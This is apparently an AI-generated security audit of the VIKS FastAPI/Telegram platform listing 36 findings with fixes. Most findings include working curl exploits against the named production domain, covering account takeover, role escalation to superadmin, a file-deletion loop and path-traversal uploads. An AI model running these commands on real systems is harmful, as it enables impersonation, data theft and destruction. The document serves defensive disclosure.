# Security Audit Report v2.2 — VIKS Platform

**Date:** 2026-04-16  
**Auditor:** Automated Security Audit (Claude Opus 4.6)  
**Scope:** Local codebase (commit `d83aa36`) + production server `37.230.115.189` (read-only inspection)  
**Domain:** `miniapp.viks22.ru`  
**Stack:** FastAPI + SQLite (aiosqlite) + React + Vite + PWA | aiogram (TG) + maxapi (MAX)

---

## Executive Summary

| Severity | Count |
|----------|-------|
| **CRITICAL** | 10 |
| **HIGH** | 12 |
| **MEDIUM** | 8 |
| **LOW / INFO** | 6 |
| **Total** | 36 |

### Top 3 Risks
1. **Complete authentication bypass** — Nearly every API endpoint trusts an attacker-controlled `tg_id` parameter instead of validating session tokens. Any user can impersonate any other user.
2. **Secrets leaked in git history** — `.env` with BOT_TOKEN, passwords, and admin IDs was committed to a public GitHub repository across 4+ commits.
3. **Unauthenticated data exposure** — Endpoints like `/api/dashboard`, `/api/logs`, `/api/settings` return full production data (PII, API keys, audit logs) without any authentication.

### Overall Security Posture: **WEAK — Critical remediation required**

### Attack Surface Summary
- 12 router files, ~80 API endpoints — **~70 lack proper authentication**
- 3 Docker containers running as root
- Port 8000 (FastAPI) exposed directly to internet (bypasses nginx)
- Uploaded files (PDFs, images) publicly accessible via nginx `/uploads/` alias
- No rate limiting anywhere (nginx or application)
- No security headers (CSP, HSTS, X-Frame-Options, etc.)

---

## CRITICAL FINDINGS (fix within 24h)

---

### C-01: No Authentication on API Endpoints — Universal Auth Bypass

- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **Location:** All files in `web/routers/` — every endpoint
- **Impact:** Any attacker who knows or guesses a Telegram user ID (a public integer) can impersonate any user on ~70 out of ~80 API endpoints. The entire application has effectively zero authentication.

**Root Cause:** While a session system exists (`web/routers/auth.py:41-52`, using `secrets.token_urlsafe(32)` with HttpOnly cookies), **no endpoint actually validates the session token**. Instead, endpoints accept `tg_id` as a Form/Query parameter and trust it blindly:

```python
# Typical vulnerable pattern (found in ALL routers)
async def some_endpoint(tg_id: int = Form(...)):
    real_tg_id = await resolve_id(tg_id)  # Just resolves linked accounts, NO auth
    user = await db.get_user(real_tg_id)
    # ... performs actions as this user
```

The `resolve_id()` function (`web/utils.py:9-14`) merely resolves linked account IDs — it performs **no authentication**.

**Exploit — Read any user's notifications:**
```bash
# Get all users first (no auth required)
curl -s "https://miniapp.viks22.ru/api/users" | python3 -c "import sys,json; [print(u['user_id'],u['fio'],u['role']) for u in json.load(sys.stdin)]"

# Read target user's notifications
curl -s "https://miniapp.viks22.ru/api/notifications/my?tg_id=VICTIM_TG_ID&limit=50"

# Read target user's support chat history
curl -s "https://miniapp.viks22.ru/api/support/history?tg_id=VICTIM_TG_ID"
```

**Exploit — Create/delete applications as any user:**
```bash
curl -X POST "https://miniapp.viks22.ru/api/applications/create" \
  -F "tg_id=VICTIM_TG_ID" -F "object_id=1" -F "date_target=2026-04-20" ...

curl -X POST "https://miniapp.viks22.ru/api/applications/42/delete" \
  -F "tg_id=VICTIM_TG_ID"
```

**Affected endpoints (non-exhaustive):**

| Router | Endpoints without auth |
|--------|----------------------|
| `users.py` | GET `/api/users`, GET `/api/users/{id}/profile`, POST `update_profile`, POST `delete`, POST `unlink_platform`, GET `/{id}/linked` |
| `applications.py` | POST `create`, POST `{id}/update`, POST `{id}/delete`, POST `{id}/review`, POST `{id}/change_status`, POST `publish`, GET `review`, GET `active`, GET `my`, GET `archive` |
| `teams.py` | POST `create`, POST `{id}/generate_invite`, POST `members/add`, POST `members/{id}/toggle_foreman`, POST `members/{id}/delete`, GET `{id}/details` |
| `equipment.py` | POST `create`, POST `{id}/update`, POST `{id}/delete`, POST `set_free`, GET `admin_list`, POST `{id}/generate_invite` |
| `objects.py` | POST `create`, POST `{id}/update`, POST `{id}/archive`, POST `{id}/restore`, POST `{id}/kp/update`, DELETE `files/{id}`, POST `files/upload`, POST `files/{id}/rename` |
| `kp.py` | POST `apps/{id}/review`, POST `apps/{id}/update_volumes`, POST `catalog/upload`, GET `catalog/download`, GET `dashboard` |
| `dashboard.py` | GET `dashboard`, GET `logs`, GET `settings`, GET `notifications/my`, POST `cron/start_day` |
| `support.py` | GET `history`, POST `chat` |
| `exchange.py` | POST `request`, POST `{id}/respond`, POST `{id}/cancel` |
| `push.py` | POST `subscribe`, POST `unsubscribe` |

**Recommended fix:**
1. Create an authentication dependency that extracts the session from the `HttpOnly` cookie:
```python
# web/auth_middleware.py
async def get_current_user(request: Request, db = Depends(get_db)):
    token = request.cookies.get("session_token")
    if not token:
        raise HTTPException(401, "Not authenticated")
    session = await db.conn.execute_fetchone(
        "SELECT user_id FROM sessions WHERE token=? AND expires > datetime('now')", (token,))
    if not session:
        raise HTTPException(401, "Session expired")
    user = await db.get_user(session["user_id"])
    if not user:
        raise HTTPException(401, "User not found")
    return user
```
2. Add `current_user = Depends(get_current_user)` to every endpoint that requires authentication.
3. Remove all `tg_id` Form/Query parameters used for identity — use `current_user["user_id"]` instead.

---

### C-02: TMA Auth — Full Account Takeover Without Verification

- **CWE:** CWE-287 (Improper Authentication)
- **Location:** `web/routers/auth.py:207-216`
- **Impact:** Any attacker can obtain a valid session token for ANY user by simply providing their Telegram ID. This is a trivial full account takeover.

**Vulnerable code:**
```python
@router.post("/api/tma/auth")
async def api_tma_auth(tg_id: int = Form(...), ...):
    user = await db.get_user(tg_id)  # No signature verification!
    if not user:
        # ... creates user
    token, _ = await _create_session(db, tg_id, response)
    return {"status": "ok", "session_token": token, ...}
```

Compare with the properly secured `/api/telegram_auth` (line 173-204) which validates HMAC signatures from Telegram's `initData`.

**Exploit:**
```bash
# Get session token for any user
curl -X POST "https://miniapp.viks22.ru/api/tma/auth" \
  -F "tg_id=VICTIM_TG_ID" \
  -c cookies.txt

# Now use the session cookie for authenticated requests
curl -b cookies.txt "https://miniapp.viks22.ru/api/auth/session?token=RETURNED_TOKEN"
```

**Recommended fix:** Add Telegram `initData` HMAC verification (same as `/api/telegram_auth` does), or remove this endpoint entirely.

---

### C-03: MAX Auth — Full Account Takeover Without Verification

- **CWE:** CWE-287 (Improper Authentication)
- **Location:** `web/routers/auth.py:126-136`
- **Impact:** Same as C-02 but for MAX platform users. Any `max_id` integer grants a session token.

**Exploit:**
```bash
curl -X POST "https://miniapp.viks22.ru/api/max/auth" -F "max_id=VICTIM_MAX_ID"
```

**Recommended fix:** Implement proper MAX platform authentication (OAuth callback or signed token verification).

---

### C-04: Privilege Escalation — Any User Can Become Superadmin

- **CWE:** CWE-269 (Improper Privilege Management)
- **Location:** `web/routers/users.py:264-291`
- **Impact:** Any user can change any other user's role to `superadmin` with zero authentication.

**Vulnerable code:**
```python
@router.put("/api/users/{user_id}/role")
async def update_role(user_id: int, role: str = Form(...), admin_id: int = Form(0)):
    if admin_id:  # admin_id defaults to 0, making this check ALWAYS FALSE
        real_admin_id = await resolve_id(admin_id)
        admin = await db.get_user(real_admin_id)
        if admin["role"] not in ("superadmin", "boss"):
            raise HTTPException(403)
    # When admin_id=0 (default), skips ALL role checks
    await db.conn.execute("UPDATE users SET role=? WHERE user_id=?", (role, user_id))
```

**Exploit:**
```bash
# Escalate any user to superadmin — no auth needed
curl -X PUT "https://miniapp.viks22.ru/api/users/VICTIM_ID/role" \
  -F "role=superadmin" -F "admin_id=0"
```

**Recommended fix:** Make `admin_id` required and non-zero, validate against authenticated session.

---

### C-05: Self-Role Escalation via Profile Update

- **CWE:** CWE-269 (Improper Privilege Management)
- **Location:** `web/routers/users.py:127-160`
- **Impact:** When editing own profile, users can set their `role` to any value including `superadmin`.

The ownership check at line 139 (`if admin_id != target_id and not is_admin: raise 403`) only prevents non-admins from editing OTHER users. It does NOT validate the `role` value for self-edits. The role is written directly to DB at line 143-145.

**Exploit:**
```bash
curl -X POST "https://miniapp.viks22.ru/api/users/MY_TG_ID/update_profile" \
  -F "tg_id=MY_TG_ID" -F "fio=MyName" -F "role=superadmin"
```

**Recommended fix:** Add role whitelist validation; only allow superadmin/boss to change roles.

---

### C-06: System Settings Exposed — API Key Leak

- **CWE:** CWE-200 (Information Exposure)
- **Location:** `web/routers/dashboard.py:171-175`
- **Impact:** `GET /api/settings` returns ALL system configuration without authentication, including the `gemini_api_key` (OpenRouter API key used for AI support).

**Exploit:**
```bash
curl -s "https://miniapp.viks22.ru/api/settings" | python3 -m json.tool
```

**Recommended fix:** Require superadmin role for `/api/settings`. Return only non-sensitive settings to other roles.

---

### C-07: Secrets Leaked in Git History (BOT_TOKEN, Passwords)

- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **Location:** Git history — commits `b85a6f6`, `39e246f`, `d94255c`, `4746522` (pushed to `github.com/BU5INESSMAN/viksstroy_bot`)
- **Impact:** The `.env` file containing all secrets was committed in 4+ commits before being deleted in `ddce8ad`. Since the repo is on GitHub, anyone with access can recover:
  - `BOT_TOKEN` (Telegram bot token) — REDACTED
  - `MODERATOR_PASS`, `FOREMAN_PASS` (role assignment passwords)
  - `SUPERADMIN_IDS`, `BOSS_IDS` (Telegram user IDs of admins)
  - `GROUP_CHAT_ID`

**Recommended fix (URGENT):**
1. **Rotate the Telegram BOT_TOKEN** via @BotFather immediately
2. **Change all passwords** (MODERATOR_PASS, FOREMAN_PASS, etc.)
3. **Scrub git history** with `git filter-repo` or BFG Repo-Cleaner to remove `.env` from all commits
4. **Force-push** the cleaned history to GitHub
5. **Add `.env` to `.gitignore`** (currently missing)

---

### C-08: Uploaded Files Publicly Accessible (Commercial Secrets)

- **CWE:** CWE-284 (Improper Access Control), CWE-200 (Information Exposure)
- **Location:** Nginx config (`/etc/nginx/sites-enabled/default`) + `web/api_main.py:37`
- **Impact:** All uploaded files (PDF estimates, Excel spreadsheets, Word documents — **commercial secrets**) are publicly accessible without authentication via two paths.

**Nginx serves uploads at `/uploads/`:**
```nginx
location /uploads/ {
    alias /root/viksstroy_bot/data/uploads/;
}
```

**FastAPI also serves them:**
```python
app.mount("/uploads", StaticFiles(directory="data/uploads"), name="uploads")
```

**Evidence — confirmed file access:**
```bash
# Returns 200 OK with Content-Type: image/png, Content-Length: 125166
curl -s -I "https://miniapp.viks22.ru/uploads/app_publish_12_1773983101.png"
```

**Files on server include:**
- Published schedule images: `schedule_2026-04-16_*.png` (work schedules with names, assignments)
- Application publish images: `app_publish_*_*.png` (work orders)
- Object PDFs: `objects/{id}/*_smr_*.pdf` (construction estimates — **commercial secrets**)
- Equipment photos: `equip_*_*.png`

**Filename pattern is predictable:** `{type}_{id}_{unix_timestamp}.{ext}` — can be enumerated.

**Exploit:**
```bash
# Enumerate and download schedule images (predictable naming)
for d in 2026-04-{10..20}; do
  for ts in $(seq 1775700000 100 1776300000); do
    curl -s -o "schedule_${d}_${ts}.png" -w "%{http_code}" \
      "https://miniapp.viks22.ru/uploads/schedule_${d}_${ts}.png" | grep -q 200 && echo "FOUND: schedule_${d}_${ts}.png"
  done
done
```

**Recommended fix:**
1. Remove the nginx `location /uploads/` block
2. Remove the FastAPI `app.mount("/uploads", ...)` line
3. Create authenticated download endpoints:
```python
@router.get("/api/files/{file_id}/download")
async def download_file(file_id: int, current_user = Depends(get_current_user), db = Depends(get_db)):
    file_record = await db.get_file(file_id)
    # Verify user has access to this object
    if not await user_can_access_object(current_user, file_record["object_id"], db):
        raise HTTPException(403)
    return FileResponse(file_record["path"])
```
4. Move upload directory outside web root

---

### C-09: Unauthenticated File Deletion

- **CWE:** CWE-306 (Missing Authentication), CWE-639 (IDOR)
- **Location:** `web/routers/objects.py:435-472`
- **Impact:** Anyone can delete any uploaded file by sequential `file_id` enumeration. No authentication, no role check, no ownership check.

**Exploit:**
```bash
# Delete files by incrementing file_id
for id in $(seq 1 100); do
  curl -X DELETE "https://miniapp.viks22.ru/api/objects/files/$id"
  echo "Deleted file $id"
done
```

**Recommended fix:** Add authentication + ownership check before deletion.

---

### C-10: Unauthenticated KP Catalog Upload (Financial Data Corruption)

- **CWE:** CWE-306 (Missing Authentication)
- **Location:** `web/routers/kp.py:210-226`
- **Impact:** Anyone can replace the entire KP catalog (pricing/work items reference data) by uploading a new Excel file. This corrupts financial data across the entire system.

**Exploit:**
```bash
# Replace entire pricing catalog
curl -X POST "https://miniapp.viks22.ru/api/kp/catalog/upload" \
  -F "file=@malicious_catalog.xlsx"
```

**Recommended fix:** Require superadmin/boss role for catalog upload.

---

## HIGH FINDINGS

---

### H-01: Port 8000 Exposed Externally (Bypasses Nginx)

- **CWE:** CWE-668 (Exposure of Resource to Wrong Sphere)
- **Location:** `docker-compose.yml` — `ports: ["8000:8000"]`
- **Evidence:**
```bash
# Direct API access bypassing nginx (confirmed 200 OK)
curl -s -o /dev/null -w "%{http_code}" "http://37.230.115.189:8000/api/dashboard?tg_id=0"
# Returns: 200
```
- **Impact:** The FastAPI backend is directly accessible on port 8000 from the internet, bypassing all nginx security measures (SSL, headers, future WAF rules).
- **Server evidence:** `ss -tlnp` shows `0.0.0.0:8000` bound by `docker-proxy`

**Recommended fix:** Change docker-compose.yml to bind only to localhost:
```yaml
ports:
  - "127.0.0.1:8000:8000"
```

---

### H-02: Full User Enumeration Without Auth

- **CWE:** CWE-200 (Information Exposure)
- **Location:** `web/routers/users.py:17-48`
- **Evidence:**
```bash
curl -s "https://miniapp.viks22.ru/api/users" | python3 -m json.tool | head -20
```
- **Impact:** `GET /api/users` returns ALL users with `user_id` (Telegram ID), `fio` (full name), `role`, blacklist status, and linked accounts. This enables all IDOR attacks and user impersonation.

**Recommended fix:** Require authentication; filter fields by role.

---

### H-03: Unauthenticated Audit Log Access

- **CWE:** CWE-200 (Information Exposure)
- **Location:** `web/routers/dashboard.py:102-103`
- **Evidence:**
```bash
curl -s "https://miniapp.viks22.ru/api/logs?tg_id=0" | head -200
```
- **Impact:** Returns full system audit logs including user names, Telegram IDs, actions, notification payloads, and internal system events. Confirmed via curl returning ~50 log entries with PII.

**Recommended fix:** Require superadmin role.

---

### H-04: Dashboard Exposes PII Without Auth

- **CWE:** CWE-200 (Information Exposure)
- **Location:** `web/routers/dashboard.py:64-100`
- **Evidence:**
```bash
curl -s "https://miniapp.viks22.ru/api/dashboard?tg_id=0" | wc -c
# Returns ~84KB of production data
```
- **Impact:** Returns 16 teams, 30+ equipment entries (with driver names, Telegram IDs, invite codes, license plates), 38 kanban applications (with foreman IDs, member lists, addresses). All without authentication.

**Recommended fix:** Require authentication; scope data by user role.

---

### H-05: Online Users Endpoint Leaks PII

- **CWE:** CWE-200 (Information Exposure)
- **Location:** `web/routers/dashboard.py:104-128`
- **Evidence:**
```bash
curl -s "https://miniapp.viks22.ru/api/online?tg_id=0"
# Returns: {"count":2,"users":[{"user_id":REDACTED,"fio":"REDACTED","role":"boss","last_active":"2026-04-16 04:18:46"}, ...]}
```
- **Impact:** Exposes currently online users with Telegram IDs, names, roles, and last active timestamps.

---

### H-06: Cross-User Notification Reading

- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Location:** `web/routers/dashboard.py:131-150`
- **Impact:** Any attacker can read any user's notifications by supplying their `tg_id`.

**Exploit:**
```bash
curl -s "https://miniapp.viks22.ru/api/notifications/my?tg_id=VICTIM_ID&limit=50"
```

---

### H-07: Cross-User Support Chat History Reading

- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Location:** `web/routers/support.py:143-157`
- **Impact:** Any attacker can read any user's AI support chat history.

**Exploit:**
```bash
curl -s "https://miniapp.viks22.ru/api/support/history?tg_id=VICTIM_ID"
```

---

### H-08: Path Traversal in File Upload Filenames

- **CWE:** CWE-22 (Path Traversal)
- **Location:** `web/routers/objects.py:364, 217, 391`
- **Impact:** Uploaded filenames are not sanitized. An attacker can use `../` sequences to write files outside the intended upload directory.

**Vulnerable code:**
```python
safe_name = f"{ts}_{f.filename}"  # "safe_name" is NOT safe
dest = os.path.join(upload_dir, safe_name)
```

**Exploit:**
```bash
curl -X POST "https://miniapp.viks22.ru/api/objects/1/files/upload" \
  -F "files=@payload.html;filename=../../../frontend/dist/malicious.html"
```

**Recommended fix:** Use `os.path.basename()` or UUID-based filenames; verify resolved path stays within upload directory.

---

### H-09: No Logout Endpoint — Sessions Irrevocable for 30 Days

- **CWE:** CWE-613 (Insufficient Session Expiration)
- **Location:** All of `web/routers/auth.py`
- **Impact:** No endpoint exists to invalidate a session. Once a token is issued, it remains valid for 30 days. If a token is compromised, there is no way to revoke it.

**Recommended fix:** Add `POST /api/auth/logout` that deletes the session from DB and clears the cookie.

---

### H-10: Unauthenticated Cron Job Trigger

- **CWE:** CWE-306 (Missing Authentication)
- **Location:** `web/routers/dashboard.py:252-296`
- **Impact:** `POST /api/cron/start_day` is publicly accessible. An attacker can trigger the auto-publish workflow, forcing publication of approved applications at arbitrary times.

**Exploit:**
```bash
curl -X POST "https://miniapp.viks22.ru/api/cron/start_day"
```

**Recommended fix:** Add shared-secret header check or restrict to localhost only.

---

### H-11: Invite Codes — Permanent, Reusable, Low Entropy

- **CWE:** CWE-330 (Insufficient Randomness)
- **Location:** `database/teams_repo.py:53-71`, `database/equipment_repo.py:57-73`
- **Impact:** Team and equipment invite codes use `uuid.uuid4()[:8]` (~32 bits), never expire, and can be reused. Brute-force is feasible.

**Recommended fix:** Use full UUID4, add expiration, make one-time-use.

---

### H-12: Session Token Leaked in JSON Response Body

- **CWE:** CWE-200 (Information Exposure)
- **Location:** `web/routers/auth.py:105`
- **Impact:** Session tokens are returned in the JSON response alongside the HttpOnly cookie. If stored in `localStorage` by the frontend (confirmed in `frontend/src/utils/tokenStorage.js`), the HttpOnly cookie protection is undermined — any XSS would steal the token.

**Recommended fix:** Remove `session_token` from JSON responses; rely solely on HttpOnly cookie.

---

## MEDIUM FINDINGS

---

### M-01: No Security Headers

- **CWE:** CWE-693 (Protection Mechanism Failure)
- **Location:** Nginx config on server
- **Missing headers:**

| Header | Status | Risk |
|--------|--------|------|
| `Content-Security-Policy` | Missing | XSS mitigation |
| `X-Frame-Options` | Missing | Clickjacking |
| `X-Content-Type-Options` | Missing | MIME sniffing |
| `Strict-Transport-Security` | Missing | SSL downgrade |
| `Referrer-Policy` | Missing | URL leakage |
| `Permissions-Policy` | Missing | Feature abuse |

**Evidence:**
```bash
curl -s -I https://miniapp.viks22.ru/ | grep -iE "x-frame|x-content|strict-transport|content-security|referrer"
# (no output — all headers missing)
```

**Recommended fix:** Add to nginx:
```nginx
add_header X-Frame-Options "DENY";
add_header X-Content-Type-Options "nosniff";
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'";
```

---

### M-02: No Rate Limiting Anywhere

- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **Location:** Nginx config (no `limit_req` zones), FastAPI (no middleware)
- **Impact:** No protection against brute-force, credential stuffing, DoS, or AI cost abuse.
- **Evidence:** `grep -rn 'limit_req' /etc/nginx/` returns empty.

**Recommended fix:**
```nginx
# In nginx http block:
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=auth:10m rate=3r/s;

# In location /api/:
limit_req zone=api burst=20 nodelay;

# In location /api/auth:
limit_req zone=auth burst=5 nodelay;
```

---

### M-03: CORS Includes Localhost Origins in Production

- **CWE:** CWE-942 (Overly Permissive CORS Policy)
- **Location:** `web/api_main.py:28-33`
- **Code:**
```python
origins = [
    "https://miniapp.viks22.ru",
    "http://localhost:5173",   # DEV ONLY — remove in production
    "http://localhost:3000",   # DEV ONLY — remove in production
]
```
- **Impact:** An attacker running a local server on the victim's machine could make authenticated cross-origin requests.

**Recommended fix:** Make origins environment-conditional.

---

### M-04: SQLite Database World-Readable (0644)

- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **Location:** `/root/viksstroy_bot/data/viksstroy.db`
- **Evidence:** `stat` shows `Access: (0644/-rw-r--r--)`
- **Impact:** Any process on the server can read the database.

**Recommended fix:** `chmod 600 /root/viksstroy_bot/data/viksstroy.db`

---

### M-05: .env File World-Readable (0644)

- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **Location:** `/root/viksstroy_bot/.env`
- **Evidence:** `ls -la` shows `-rw-r--r-- 1 root root 3218`
- **Impact:** All secrets in .env are readable by any process.

**Recommended fix:** `chmod 600 /root/viksstroy_bot/.env`

---

### M-06: No File Upload Size Limits

- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **Location:** `web/routers/objects.py` — all upload endpoints
- **Impact:** No file size limits enforced. Attackers can exhaust disk space.

**Recommended fix:** Add `UploadFile` size validation or nginx `client_max_body_size`.

---

### M-07: AI Support — No Rate Limiting (Cost Exposure)

- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **Location:** `web/routers/support.py:214-318`
- **Impact:** No rate limiting on AI chat requests. Uses `openrouter/auto` (paid). An attacker can rack up significant API costs.

**Recommended fix:** Add per-user rate limiting (e.g., 10 messages/min, 100/hour).

---

### M-08: Timing-Vulnerable Password Comparison

- **CWE:** CWE-208 (Observable Timing Discrepancy)
- **Location:** `web/routers/auth.py:143-150, 223-229`, `main.py:374-380`, `main_max.py:339-345`
- **Impact:** Password comparison uses `==` instead of `hmac.compare_digest()`, enabling timing attacks.

**Recommended fix:** Use `secrets.compare_digest()` for all password comparisons.

---

## LOW / INFORMATIONAL FINDINGS

---

### L-01: Docker Containers Run as Root

- **Location:** `docker-compose.yml` (no `user:` directive)
- **Impact:** Container escape would grant root on host.
- **Fix:** Add `user: "1000:1000"` to services.

### L-02: .env Not in .gitignore

- **Location:** `.gitignore`
- **Impact:** Risk of accidental re-commit.
- **Fix:** Add `.env` and `.env.*` to `.gitignore`.

### L-03: SSL Verification Disabled for Font Download

- **Location:** `web/services/image_service.py:31-32`
- **Code:** `ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE`
- **Impact:** MITM risk when downloading fonts.
- **Fix:** Enable SSL verification or bundle fonts locally.

### L-04: Unpinned Dependency Versions

- **Location:** `requirements.txt`
- **Impact:** Supply chain risk from unpinned versions.
- **Fix:** Pin all dependencies to exact versions.

### L-05: Session Token Accepted via Query Parameter

- **Location:** `web/routers/auth.py:255`
- **Impact:** Token leaks in server logs, browser history, referrer headers.
- **Fix:** Accept tokens only from HttpOnly cookies.

### L-06: Internal Error Details Leaked to Clients

- **Location:** Multiple endpoints (e.g., `web/routers/users.py:156`)
- **Code:** `f"Ошибка сохранения: {e}"` — internal error strings returned to client.
- **Fix:** Return generic error messages; log details server-side.

---

## POSITIVE FINDINGS (What's Done Right)

| Area | Assessment |
|------|-----------|
| **SQL Injection** | All queries use parameterized `?` placeholders. No SQL injection found. |
| **XSS** | No `dangerouslySetInnerHTML` or `innerHTML`. React auto-escapes. Custom markdown renderer uses JSX elements safely. |
| **Command Injection** | No `subprocess`, `os.system`, `eval`, or `exec` found. |
| **Session Token Entropy** | `secrets.token_urlsafe(32)` — 256 bits. Strong. |
| **Cookie Flags** | `httponly=True`, `secure=True`, `samesite="lax"` — correct. |
| **Telegram Widget Auth** | `/api/telegram_auth` properly validates HMAC-SHA256 signature. |
| **Service Worker** | API calls excluded from caching. Auth cache properly cleared on logout. |
| **VAPID Keys** | Loaded from env vars. Public key served via API (correct). Private key never exposed. |
| **Webhook Surface** | Both bots use polling (not webhooks). No webhook attack surface. |
| **Auth Link Codes** | One-time use with expiration. Properly consumed. |
| **server_tokens** | `server_tokens off` in nginx.conf (good). |

---

## Fix Priority Order

| Priority | Finding | Action | Effort |
|----------|---------|--------|--------|
| 1 | C-07 | **TODAY:** Rotate BOT_TOKEN, change all passwords, scrub git history | 1h |
| 2 | C-01 | Implement auth middleware using session cookies on ALL endpoints | 4-8h |
| 3 | C-02, C-03 | Fix TMA/MAX auth — add signature verification or remove | 2h |
| 4 | C-04, C-05 | Fix role escalation — validate roles, require admin auth | 1h |
| 5 | C-06 | Protect `/api/settings` — require superadmin | 15min |
| 6 | C-08 | Remove `/uploads/` nginx alias, serve files via authenticated endpoint | 2-4h |
| 7 | C-09, C-10 | Add auth to file delete and KP catalog upload | 30min |
| 8 | H-01 | Bind port 8000 to 127.0.0.1 in docker-compose.yml | 5min |
| 9 | H-09 | Add logout endpoint | 30min |
| 10 | H-10 | Protect cron endpoints (shared secret or localhost only) | 30min |
| 11 | M-01 | Add security headers in nginx | 15min |
| 12 | M-02 | Add nginx rate limiting | 30min |
| 13 | H-08 | Sanitize upload filenames | 15min |
| 14 | M-04, M-05 | Fix file permissions (chmod 600) | 5min |
| 15 | L-02 | Add .env to .gitignore | 1min |

---

## Attestation

| Metric | Value |
|--------|-------|
| Local files analyzed | 45+ (12 routers, 9 DB repos, 10 services, frontend utils, configs) |
| Remote commands executed | 12 (all read-only: cat, ls, find, stat, ss, grep, docker ps) |
| Endpoints reviewed | ~80 across 12 router files |
| Exploits verified via curl | 8 (dashboard, online, logs, uploads, port 8000, settings, file access, directory probe) |
| Lines of code reviewed | ~8,000+ (backend) + ~3,000 (frontend) |
| Critical findings | 10 |
| Total findings | 36 |

---

*Report generated 2026-04-16. No changes were made to the production server or local repository. Awaiting human review before any remediation.*
